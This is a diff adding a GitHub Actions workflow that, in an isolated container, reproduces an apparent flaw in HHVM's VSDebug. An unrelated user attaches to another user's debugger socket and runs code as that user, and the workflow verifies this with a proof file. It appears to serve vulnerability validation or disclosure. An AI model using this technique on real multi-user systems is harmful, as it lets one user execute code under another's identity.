@@ -1,0 +1,51 @@
+name: HHVM VSDebug cross-user validation
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  reproduce:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 15
+    steps:
+      - uses: actions/checkout@v6
+      - name: Start isolated HHVM container
+        run: |
+          docker pull hhvm/hhvm:latest
+          docker image inspect hhvm/hhvm:latest --format '{{index .RepoDigests 0}}'
+          docker run -d --name hhvm-vsdebug-proof \
+            -v "$PWD:/proof:ro" \
+            hhvm/hhvm:latest sleep 600
+          docker exec hhvm-vsdebug-proof useradd --uid 2001 --create-home victim
+          docker exec hhvm-vsdebug-proof useradd --uid 2002 --create-home attacker
+      - name: Start victim debugger as uid 2001
+        run: |
+          docker exec -d --user victim hhvm-vsdebug-proof \
+            hhvm -m vsdebug \
+              --vsDebugDomainSocketPath=/tmp/hhvm-vsdebug.sock \
+              --vsDebugNoWait=true \
+              /proof/hhvm-vsdebug-victim.php
+          for attempt in $(seq 1 30); do
+            if docker exec hhvm-vsdebug-proof test -S /tmp/hhvm-vsdebug.sock; then
+              break
+            fi
+            sleep 1
+          done
+          docker exec hhvm-vsdebug-proof test -S /tmp/hhvm-vsdebug.sock
+          docker exec hhvm-vsdebug-proof stat -c 'socket_mode=%a socket_uid=%u socket_gid=%g' /tmp/hhvm-vsdebug.sock
+          docker exec hhvm-vsdebug-proof cat /tmp/hhvm-victim-uid
+      - name: Attach and evaluate as unrelated uid 2002
+        run: |
+          docker exec --user attacker hhvm-vsdebug-proof \
+            hhvm /proof/hhvm-vsdebug-attacker.php | tee /tmp/attacker-output.txt
+          docker exec hhvm-vsdebug-proof stat -c 'proof_uid=%u proof_gid=%g' /tmp/hhvm-cross-user-proof
+          docker exec hhvm-vsdebug-proof cat /tmp/hhvm-cross-user-proof
+          grep -q 'evaluate_success=true' /tmp/attacker-output.txt
+          test "$(docker exec hhvm-vsdebug-proof cat /tmp/hhvm-cross-user-proof)" = 'executed-as-uid=2001'
+      - name: Container logs
+        if: always()
+        run: docker logs hhvm-vsdebug-proof
+
